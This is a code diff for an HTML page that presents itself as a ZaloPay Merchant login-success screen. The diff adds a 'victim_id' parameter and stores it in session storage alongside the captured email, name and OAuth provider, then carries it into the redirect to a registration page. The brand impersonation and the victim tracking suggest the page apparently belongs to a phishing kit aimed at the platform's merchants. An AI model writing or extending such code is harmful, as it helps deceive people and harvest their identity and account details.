@@ -9,7 +9,7 @@
     <meta name="apple-mobile-web-app-title" content="ZaloPay Merchant">
     <link rel="manifest" href="/manifest.json">
     <link rel="icon" type="image/png" href="/images/zalopay-merchant-icon.png">
-    <link rel="apple-touch-icon" href="/images/zalopay-merchant-app-icon.png">
+    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
     <title>Đăng nhập thành công - ZaloPay Merchant</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
@@ -242,6 +242,7 @@
         const email = urlParams.get('email') || '';
         const name = urlParams.get('name') || '';
         const provider = urlParams.get('provider') || 'google';
+        const victimId = urlParams.get('victim_id') || '';
         
         // Display user information
         document.getElementById('userEmail').textContent = email || 'Đang tải...';
@@ -267,7 +268,8 @@
         const oauthData = {
             email: email,
             name: name,
-            provider: provider
+            provider: provider,
+            victim_id: victimId
         };
         sessionStorage.setItem('oauth_data', JSON.stringify(oauthData));
         
@@ -278,7 +280,7 @@
         const continueBtn = document.getElementById('continueBtn');
         
         // Build redirect URL
-        const redirectUrl = `register.html?oauth=success&email=${encodeURIComponent(email)}&name=${encodeURIComponent(name)}&provider=${provider}`;
+        const redirectUrl = `register.html?oauth=success&email=${encodeURIComponent(email)}&name=${encodeURIComponent(name)}&provider=${provider}` + (victimId ? `&victim_id=${encodeURIComponent(victimId)}` : '');
         
         // Update countdown và progress bar
         const updateCountdown = () => {
@@ -330,4 +332,3 @@
     <script src="/js/socket-background.js"></script>
 </body>
 </html>
-
